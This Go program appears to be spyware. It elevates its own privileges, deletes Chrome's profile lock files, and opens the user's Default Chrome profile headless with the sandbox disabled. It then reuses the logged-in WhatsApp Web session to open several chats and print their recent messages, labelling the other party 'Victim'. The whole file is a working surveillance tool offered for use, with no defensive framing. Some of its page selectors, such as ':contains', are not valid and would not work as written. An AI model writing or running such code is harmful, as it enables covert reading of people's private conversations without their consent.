package main 

import (
	"context"
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"
	"github.com/chromedp/chromedp"
)

func isAdmin() bool {
	if runtime.GOOS == "windows" {
		_, err := os.Open("\\.\\PHYSICALDRIVE0")
		return err == nil
	} else {
		currentUser, err := user.Current()
		if err != nil {
			return false
		}
		return currentUser.Uid == "0"
	}
}

func runAsAdmin() {
	if runtime.GOOS == "windows" {
		verb := "runas"
		exe, _ := os.Executable()
		cmd := exec.Command("powershell", append([]string{"-Command", "Start-Process", exe, "-Verb", verb}, os.Args[1:]...)...)
		cmd.Stdin = os.Stdin
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		err := cmd.Run()
		if err != nil {
			fmt.Println("Failed to elevate privileges:", err)
		}
		os.Exit(0)
	} else {
		exe, _ := os.Executable()
		cmd := exec.Command("sudo", append([]string{exe}, os.Args[1:]...)...)
		cmd.Stdin = os.Stdin
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		err := cmd.Run()
		if err != nil {
			fmt.Println("Failed to elevate privileges:", err)
		}
		os.Exit(0)
	}
}

func cleanSingletonLocks(chromePath string) {
	singletonLock := filepath.Join(chromePath, "SingletonLock")
	if _, err := os.Stat(singletonLock); err == nil {
		fmt.Printf("Removing existing singleton lock: %s\n", singletonLock)
		os.Remove(singletonLock)
	}
	
	singletonSocket := filepath.Join(chromePath, "SingletonSocket")
	if _, err := os.Stat(singletonSocket); err == nil {
		fmt.Printf("Removing existing singleton socket: %s\n", singletonSocket)
		os.Remove(singletonSocket)
	}
}

func main() {
	if !isAdmin() {
		fmt.Println("Not running as admin, attempting to relaunch with elevated privileges...")
		runAsAdmin()
		return
	}
	
	homeDir, err := os.UserHomeDir()
	if err != nil {
		fmt.Println("Error getting home directory:", err)
		return
	}
	
	var possiblePaths []string
	switch runtime.GOOS {
	case "windows":
		possiblePaths = []string{
			filepath.Join(homeDir, "AppData", "Local", "Google", "Chrome", "User Data"),
			filepath.Join(homeDir, "AppData", "Roaming", "Google", "Chrome", "User Data"),
		}
	case "darwin":
		possiblePaths = []string{
			filepath.Join(homeDir, "Library", "Application Support", "Google", "Chrome"),
			filepath.Join(homeDir, "Library", "Application Support", "Google", "Chrome", "User Data"),
			filepath.Join(homeDir, "Library", "Application Support", "Chromium"),
		}
	case "linux":
		possiblePaths = []string{
			filepath.Join(homeDir, ".config", "google-chrome"),
			filepath.Join(homeDir, ".config", "google-chrome", "User Data"),
			filepath.Join(homeDir, ".config", "chromium"),
		}
	default:
		fmt.Println("Unsupported operating system")
		return
	}
	
	var chromePath string
	for _, path := range possiblePaths {
		if _, err := os.Stat(path); err == nil {
			chromePath = path
			break
		}
	}
	
	if chromePath == "" {
		fmt.Println("Chrome directory not found. Checked paths:")
		for _, path := range possiblePaths {
			fmt.Println(" -", path)
		}
		return
	}
	
	fmt.Println("Found Chrome directory at:", chromePath)
	
	cleanSingletonLocks(chromePath)
	
	defaultProfilePath := filepath.Join(chromePath, "Default")
	if _, err := os.Stat(defaultProfilePath); err == nil {
		fmt.Println("Opening Default profile:")
		opts := append(chromedp.DefaultExecAllocatorOptions[:],
			chromedp.Flag("headless", true),
			chromedp.Flag("disable-gpu", true),
			chromedp.UserDataDir(chromePath),
			chromedp.Flag("profile-directory", "Default"),
			chromedp.NoFirstRun,
			chromedp.NoDefaultBrowserCheck,
			chromedp.Flag("no-sandbox", true),
			chromedp.Flag("disable-dev-shm-usage", true),
			chromedp.Flag("disable-background-timer-throttling", true),
			chromedp.Flag("disable-backgrounding-occluded-windows", true),
			chromedp.Flag("disable-renderer-backgrounding", true),
			chromedp.Flag("disable-features", "TranslateUI"),
			chromedp.Flag("disable-ipc-flooding-protection", true),
			chromedp.Flag("disable-popup-blocking", true),
			chromedp.Flag("disable-notifications", true),
			chromedp.Flag("disable-default-apps", true),
			chromedp.Flag("disable-extensions", true),
		)
		allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
		defer cancel()
		ctx, cancelCtx := chromedp.NewContext(allocCtx, chromedp.WithLogf(log.Printf))
		defer cancelCtx()
		ctx, cancelTimeout := context.WithTimeout(ctx, 300*time.Second)
		defer cancelTimeout()
		
		var pageTitle string
		err := chromedp.Run(ctx,
			chromedp.Navigate("https://web.whatsapp.com"),
			chromedp.Sleep(15*time.Second),
			chromedp.Title(&pageTitle),
			chromedp.WaitVisible(`div[role="listitem"]`, chromedp.ByQuery),
			chromedp.Sleep(15*time.Second),
			chromedp.ActionFunc(func(ctx context.Context) error {
				var messageCount int
				err := chromedp.Evaluate(`
					document.querySelectorAll('div[role="listitem"]').length
				`, &messageCount).Do(ctx)
				if err != nil {
					return err
				}
				processedChats := make(map[string]bool)
				shouldStop := false
				maxChats := 8
				if messageCount < maxChats {
					maxChats = messageCount
				}
				for i := 0; i < maxChats && !shouldStop; i++ {
					var hasSpan bool
					err = chromedp.Evaluate(fmt.Sprintf(`
						(() => {
							const chat = document.querySelectorAll('div[role="listitem"]')[%d];
							if (!chat) return false;
							const preview = chat.querySelector('._ak8k span');
							return !!preview;
						})()
					`, i), &hasSpan).Do(ctx)
					if err != nil {
						continue
					}
					if !hasSpan {
						continue
					}
					clickCtx, cancelClick := context.WithTimeout(ctx, 30*time.Second)
					selector := fmt.Sprintf(`div[role="listitem"]:nth-of-type(%d)`, i+1)
					err := chromedp.Click(selector, chromedp.ByQuery).Do(clickCtx)
					cancelClick()
					if err != nil {
						altSelector := fmt.Sprintf(`div[role="listitem"]:nth-child(%d)`, i+1)
						err = chromedp.Click(altSelector, chromedp.ByQuery).Do(ctx)
						if err != nil {
							err = chromedp.Evaluate(fmt.Sprintf(`
								(() => {
									const chats = document.querySelectorAll('div[role="listitem"]');
									if (chats[%d]) {
										chats[%d].click();
										return true;
									}
									return false;
								})()
							`, i, i), nil).Do(ctx)
							if err != nil {
								continue
							}
						}
					}
					chatCtx, cancelChat := context.WithTimeout(ctx, 20*time.Second)
					chromedp.ActionFunc(func(ctx context.Context) error {
						chromedp.Sleep(1 * time.Second).Do(ctx)
						
						chromedp.ActionFunc(func(ctx context.Context) error {
							chromedp.Evaluate(`
								(() => {
									const popups = document.querySelectorAll('[role="dialog"], .popup, .modal, [data-testid="popup"]');
									popups.forEach(popup => {
										const closeBtn = popup.querySelector('[aria-label="Close"], .close, [data-testid="close"], button[aria-label*="Close"], button[aria-label*="close"]');
										if (closeBtn) {
											closeBtn.click();
										}
									});
									
									const openLinkBtns = document.querySelectorAll('button:contains("Open"), button:contains("Allow"), button:contains("Continue"), button:contains("OK")');
									openLinkBtns.forEach(btn => {
										if (btn.textContent.includes('Open') || btn.textContent.includes('Allow') || btn.textContent.includes('Continue') || btn.textContent.includes('OK')) {
											btn.click();
										}
									});
									
									const appStoreBtns = document.querySelectorAll('button:contains("App Store"), button:contains("app store"), a[href*="apps.apple.com"], a[href*="play.google.com"]');
									appStoreBtns.forEach(btn => {
										const closeBtn = btn.closest('[role="dialog"], .popup, .modal')?.querySelector('[aria-label="Close"], .close, [data-testid="close"]');
										if (closeBtn) {
											closeBtn.click();
										}
									});
									
									const systemDialogs = document.querySelectorAll('button:contains("Cancel"), button:contains("Don\'t Allow"), button:contains("Not Now")');
									systemDialogs.forEach(btn => {
										if (btn.textContent.includes('Cancel') || btn.textContent.includes('Don\'t Allow') || btn.textContent.includes('Not Now')) {
											btn.click();
										}
									});
									
									return true;
								})()
							`, nil).Do(ctx)
							
							var hasSystemDialog bool
							chromedp.Evaluate(`
								(() => {
									const systemDialogs = document.querySelectorAll('button:contains("Cancel"), button:contains("Don\'t Allow"), button:contains("Not Now"), button:contains("Open")');
									return systemDialogs.length > 0;
								})()
							`, &hasSystemDialog).Do(ctx)
							
							if hasSystemDialog {
								fmt.Printf("System dialog detected! Please manually handle any system popups and press Enter to continue...\n")
								fmt.Scanln()
							}
							
							return nil
						}).Do(ctx)
						
						var chatName string
						err := chromedp.Evaluate(`
							(() => {
								const header = document.querySelector('[data-testid="conversation-title"]');
								if (header) {
									return header.textContent.trim();
								}
								return null;
							})()
						`, &chatName).Do(ctx)
						if err == nil && chatName != "" {
							if processedChats[chatName] {
								return nil
							}
							processedChats[chatName] = true
						}
						err = chromedp.Evaluate(`
							document.querySelectorAll('.message-in, .message-out').length
						`, &messageCount).Do(ctx)
						if err != nil {
							return nil
						}
						if messageCount == 0 {
							return nil
						}
						err = chromedp.WaitVisible(`.message-in, .message-out`, chromedp.ByQuery).Do(ctx)
						if err != nil {
							return nil
						}
						chromedp.Sleep(1 * time.Second).Do(ctx)
						err = chromedp.Evaluate(`
							(() => {
								let chatContainer = document.querySelector('div[data-tab="8"]');
								if (!chatContainer) {
									chatContainer = document.querySelector('div[role="application"]');
								}
								if (!chatContainer) {
									chatContainer = document.querySelector('.copyable-area');
								}
								if (chatContainer) {
									chatContainer.scrollTop = 0;
									return true;
								} else {
									return false;
								}
							})()
						`, nil).Do(ctx)
						chromedp.Sleep(1 * time.Second).Do(ctx)
						chromedp.ActionFunc(func(ctx context.Context) error {
							chromedp.Evaluate(`
								(() => {
									const popups = document.querySelectorAll('[role="dialog"], .popup, .modal');
									popups.forEach(popup => {
										const closeBtn = popup.querySelector('[aria-label="Close"], .close, [data-testid="close"]');
										if (closeBtn) {
											closeBtn.click();
										}
									});
									const openLinkBtns = document.querySelectorAll('button:contains("Open"), button:contains("Allow")');
									openLinkBtns.forEach(btn => {
										if (btn.textContent.includes('Open') || btn.textContent.includes('Allow')) {
											btn.click();
										}
									});
									return true;
								})()
							`, nil).Do(ctx)
							return nil
						}).Do(ctx)
						msgCtx, cancelMsg := context.WithTimeout(ctx, 5*time.Second)
						err = chromedp.Evaluate(`
							document.querySelectorAll('.message-in, .message-out').length
						`, &messageCount).Do(msgCtx)
						cancelMsg()
						if err != nil {
							return nil
						}
						if messageCount == 0 {
							return nil
						}
						maxMessages := 10
						if messageCount > maxMessages {
							messageCount = maxMessages
						}
						for msgIndex := 0; msgIndex < messageCount; msgIndex++ {
							var messageInfo map[string]interface{}
							extractCtx, cancelExtract := context.WithTimeout(ctx, 2*time.Second)
							err = chromedp.Evaluate(fmt.Sprintf(`
								(() => {
									const messageElements = document.querySelectorAll('.message-in, .message-out');
									const msgElement = messageElements[%d];
									if (!msgElement) return null;
									
									const messageData = {
										type: msgElement.classList.contains('message-in') ? 'incoming' : 'outgoing',
										index: %d,
										text: '',
										timestamp: '',
										sender: '',
										recipient: ''
									};
									
									const textElement = msgElement.querySelector('.copyable-text');
									if (textElement) {
										messageData.text = textElement.textContent.trim();
									}
									
									const timeElement = msgElement.querySelector('[dir="auto"]');
									if (timeElement) {
										messageData.timestamp = timeElement.textContent.trim();
									}
									
									const senderElement = msgElement.querySelector('[aria-label]');
									if (senderElement) {
										messageData.sender = senderElement.getAttribute('aria-label');
									}
									
									const recipientElement = document.querySelector('[data-testid="conversation-title"]');
									if (recipientElement) {
										messageData.recipient = recipientElement.textContent.trim();
									}
									
									return messageData;
								})()
							`, msgIndex, msgIndex), &messageInfo).Do(extractCtx)
							cancelExtract()
							if err != nil {
								continue
							}
							if messageInfo != nil {
								msgType, _ := messageInfo["type"].(string)
								text, _ := messageInfo["text"].(string)
								timestamp, _ := messageInfo["timestamp"].(string)
								recipient, _ := messageInfo["recipient"].(string)
								sender, _ := messageInfo["sender"].(string)
								
								if text != "" && !strings.Contains(strings.ToLower(text), "clicking chat") && !strings.Contains(strings.ToLower(text), "successfully clicked") && !strings.Contains(strings.ToLower(text), "found") && !strings.Contains(strings.ToLower(text), "messages in chat") {
									if msgType == "incoming" && (sender == "" || sender == "You") {
										sender = "Victim"
									}
									
									if msgType == "outgoing" && recipient == "" {
										recipient = "Victim"
									}
									
									var typeColor, textColor string
									
									if msgType == "incoming" {
										typeColor = "\033[32m"
										textColor = "\033[37m"
									} else {
										typeColor = "\033[33m" 
										textColor = "\033[37m" 
									}
									
									resetColor := "\033[0m"
									
									if msgType == "incoming" {
										fmt.Printf("%s[%s]%s %s%s%s → %s%s%s → %s%s%s\n", 
											typeColor, 
											strings.ToUpper(msgType), 
											resetColor,
											"\033[34m",
											timestamp,
											resetColor,
											"\033[36m",
											sender,
											resetColor,
											textColor,
											text,
											resetColor)
									} else {
										fmt.Printf("%s[%s]%s %s%s%s → %s%s%s → %s%s%s\n", 
											typeColor, 
											strings.ToUpper(msgType), 
											resetColor,
											"\033[34m",
											timestamp,
											resetColor,
											"\033[35m",
											recipient,
											resetColor,
											textColor,
											text,
											resetColor)
									}
								}
							}
						}
						return nil
					}).Do(chatCtx)
					cancelChat()
					time.Sleep(2 * time.Second)
					
					chromedp.ActionFunc(func(ctx context.Context) error {
						chromedp.Evaluate(`
							(() => {
								const popups = document.querySelectorAll('[role="dialog"], .popup, .modal, [data-testid="popup"]');
								popups.forEach(popup => {
									const closeBtn = popup.querySelector('[aria-label="Close"], .close, [data-testid="close"], button[aria-label*="Close"], button[aria-label*="close"]');
									if (closeBtn) {
										closeBtn.click();
									}
								});
								
								const openLinkBtns = document.querySelectorAll('button:contains("Open"), button:contains("Allow"), button:contains("Continue"), button:contains("OK")');
								openLinkBtns.forEach(btn => {
									if (btn.textContent.includes('Open') || btn.textContent.includes('Allow') || btn.textContent.includes('Continue') || btn.textContent.includes('OK')) {
										btn.click();
									}
								});
								
								const appStoreBtns = document.querySelectorAll('button:contains("App Store"), button:contains("app store"), a[href*="apps.apple.com"], a[href*="play.google.com"]');
								appStoreBtns.forEach(btn => {
									const closeBtn = btn.closest('[role="dialog"], .popup, .modal')?.querySelector('[aria-label="Close"], .close, [data-testid="close"]');
									if (closeBtn) {
										closeBtn.click();
									}
								});
								
								const systemDialogs = document.querySelectorAll('button:contains("Cancel"), button:contains("Don\'t Allow"), button:contains("Not Now")');
								systemDialogs.forEach(btn => {
									if (btn.textContent.includes('Cancel') || btn.textContent.includes('Don\'t Allow') || btn.textContent.includes('Not Now')) {
										btn.click();
									}
								});
								
								return true;
							})()
						`, nil).Do(ctx)
						return nil
					}).Do(ctx)
					
					var chatListVisible bool
					chromedp.Evaluate(`
						document.querySelectorAll('div[role="listitem"]').length > 0
					`, &chatListVisible).Do(ctx)
					if !chatListVisible {
						fmt.Printf("Chat list no longer visible after chat %d, trying to navigate back...\n", i+1)
						navigateCtx, cancelNavigate := context.WithTimeout(ctx, 30*time.Second)
						chromedp.ActionFunc(func(ctx context.Context) error {
							err := chromedp.Evaluate(`
							(() => {
								const backBtn = document.querySelector('[data-testid="back"], [aria-label="Back"], .back-button');
								if (backBtn) {
									backBtn.click();
									return true;
								}
								const menuBtn = document.querySelector('[data-testid="menu"], [aria-label="Menu"], .menu-button');
								if (menuBtn) {
									menuBtn.click();
									return true;
								}
								const chatListBtn = document.querySelector('[data-testid="chat-list"], [aria-label="Chats"]');
								if (chatListBtn) {
									chatListBtn.click();
									return true;
								}
								return false;
							})()
						`, nil).Do(ctx)
						if err != nil {
							fmt.Printf("Error navigating back: %v\n", err)
						}
						chromedp.Sleep(5 * time.Second).Do(ctx)
						
						chromedp.ActionFunc(func(ctx context.Context) error {
							chromedp.Evaluate(`
								(() => {
									const popups = document.querySelectorAll('[role="dialog"], .popup, .modal, [data-testid="popup"]');
									popups.forEach(popup => {
										const closeBtn = popup.querySelector('[aria-label="Close"], .close, [data-testid="close"], button[aria-label*="Close"], button[aria-label*="close"]');
										if (closeBtn) {
											closeBtn.click();
										}
									});
									
									const openLinkBtns = document.querySelectorAll('button:contains("Open"), button:contains("Allow"), button:contains("Continue"), button:contains("OK")');
									openLinkBtns.forEach(btn => {
										if (btn.textContent.includes('Open') || btn.textContent.includes('Allow') || btn.textContent.includes('Continue') || btn.textContent.includes('OK')) {
											btn.click();
										}
									});
									
									const appStoreBtns = document.querySelectorAll('button:contains("App Store"), button:contains("app store"), a[href*="apps.apple.com"], a[href*="play.google.com"]');
									appStoreBtns.forEach(btn => {
										const closeBtn = btn.closest('[role="dialog"], .popup, .modal')?.querySelector('[aria-label="Close"], .close, [data-testid="close"]');
										if (closeBtn) {
											closeBtn.click();
										}
									});
									
									const systemDialogs = document.querySelectorAll('button:contains("Cancel"), button:contains("Don\'t Allow"), button:contains("Not Now")');
									systemDialogs.forEach(btn => {
										if (btn.textContent.includes('Cancel') || btn.textContent.includes('Don\'t Allow') || btn.textContent.includes('Not Now')) {
											btn.click();
										}
									});
									
									return true;
								})()
							`, nil).Do(ctx)
							return nil
						}).Do(ctx)
						
						var chatListVisibleAgain bool
						chromedp.Evaluate(`
							document.querySelectorAll('div[role="listitem"]').length > 0
						`, &chatListVisibleAgain).Do(ctx)
						if !chatListVisibleAgain {
							fmt.Printf("Could not navigate back to chat list, stopping...\n")
							shouldStop = true
							return nil
						}
						fmt.Printf("Successfully navigated back to chat list\n")
						return nil
						}).Do(navigateCtx)
						cancelNavigate()
						if err != nil {
							fmt.Printf("Failed to navigate back, stopping...\n")
							shouldStop = true
							return nil
						}
					}
				}
				return nil
			}),
		)
		if err != nil {
			fmt.Printf("Error with Default profile: %v\n", err)
			return
		}
		fmt.Println("Page Title:", pageTitle)
		fmt.Println(" -", defaultProfilePath)
	} else {
		fmt.Println("Default profile not found at:", defaultProfilePath)
	}
}